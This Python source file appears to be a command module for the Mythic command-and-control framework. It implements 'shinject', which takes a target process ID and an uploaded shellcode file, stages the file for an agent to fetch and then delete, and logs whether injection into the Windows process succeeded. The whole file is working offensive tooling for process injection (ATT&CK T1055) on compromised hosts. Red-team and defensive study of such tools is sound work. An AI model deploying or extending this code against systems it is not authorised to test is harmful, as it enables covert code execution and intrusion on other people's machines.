from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to inject into.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="Shellcode file to inject",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject (modal popup)"
    description = "Inject shellcode into a remote process."
    version = 1
    author = "@checkymander"
    argument_class = ShinjectArguments
    attackmapping = ["T1055"]  # Process Injection
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Windows only for this implementation
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        print(f"DEBUG: Starting shinject task creation for PID {taskData.args.get_arg('pid')}")
        print(f"DEBUG: Shellcode file ID: {taskData.args.get_arg('shellcode')}")
        
        try:
            print(f"DEBUG: Searching for file with ID: {taskData.args.get_arg('shellcode')}")
            # Get file information from Mythic
            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                AgentFileID=taskData.args.get_arg("shellcode"),
                TaskID=taskData.Task.ID,
            ))
            
            print(f"DEBUG: File search response - Success: {file_resp.Success}")
            if not file_resp.Success:
                print(f"DEBUG: File search failed with error: {file_resp.Error}")
            else:
                print(f"DEBUG: Found {len(file_resp.Files)} file(s)")
            
            if file_resp.Success:
                if len(file_resp.Files) > 0:
                    original_file_name = file_resp.Files[0].Filename
                    file_size = file_resp.Files[0].Size
                    
                    print(f"DEBUG: Processing file - Name: {original_file_name}, Size: {file_size}, ID: {file_resp.Files[0].AgentFileId}")
                    
                    response.DisplayParams = "Injecting {} ({} bytes) into PID {}".format(
                        original_file_name, 
                        file_size,
                        taskData.args.get_arg("pid")
                    )
                    
                    # Replace the shellcode parameter with the file ID that the agent expects
                    # The Rust agent looks for "shellcode-file-id" parameter
                    print(f"DEBUG: Adding shellcode-file-id parameter: {file_resp.Files[0].AgentFileId}")
                    taskData.args.add_arg("shellcode-file-id", file_resp.Files[0].AgentFileId)
                    taskData.args.remove_arg("shellcode")
                    
                    # Set the file to be deleted after the agent fetches it
                    # This triggers Mythic's automatic file download to the agent
                    print(f"DEBUG: Setting file to be deleted after fetch")
                    await SendMythicRPCFileUpdate(MythicRPCFileUpdateMessage(
                        AgentFileId=file_resp.Files[0].AgentFileId,
                        DeleteAfterFetch=True,
                        Comment="Shellcode for injection into process {}".format(taskData.args.get_arg("pid"))
                    ))
                    
                    print(f"DEBUG: Prepared shellcode file {original_file_name} (ID: {file_resp.Files[0].AgentFileId}) for injection into PID {taskData.args.get_arg('pid')}")
                    print(f"DEBUG: Task parameters after processing: {taskData.args}")
                    
                else:
                    raise Exception("Failed to fetch uploaded file from Mythic (ID: {})".format(taskData.args.get_arg("shellcode")))
            else:
                raise Exception("Failed to search for file: {}".format(file_resp.Error))
                
        except Exception as e:
            response.Success = False
            response.Error = "Error preparing shellcode file: {}".format(str(e))
            print(f"DEBUG: Error in create_go_tasking: {str(e)}")
            
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from shellcode injection
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        print(f"DEBUG: Processing shinject response for task {task.Task.ID}")
        print(f"DEBUG: Response type: {type(response)}")
        print(f"DEBUG: Response content: {response}")
        
        try:
            # FIX: Handle both string and JSON responses
            if isinstance(response, dict):
                # JSON response - extract output
                response_text = response.get("output", str(response))
                print(f"DEBUG: Extracted JSON response text: {response_text}")
            else:
                # Plain string response
                response_text = str(response)
                print(f"DEBUG: Using plain string response: {response_text}")
            
            # Create a task response output
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=response_text.encode()
            ))
            
            # Log successful injection for operation events
            if any(success_word in response_text.lower() for success_word in ["success", "injected", "executed"]) and "fail" not in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Successfully injected shellcode into PID {}".format(task.args.get_arg("pid")),
                    Level="info"
                ))
                
            elif "error" in response_text.lower() or "fail" in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Failed to inject shellcode into PID {}: {}".format(task.args.get_arg("pid"), response_text),
                    Level="warning"
                ))
                
        except Exception as e:
            error_msg = "Error processing shinject response: {}".format(str(e))
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=error_msg.encode()
            ))
            resp.Success = False
            resp.Error = error_msg
            
        return resp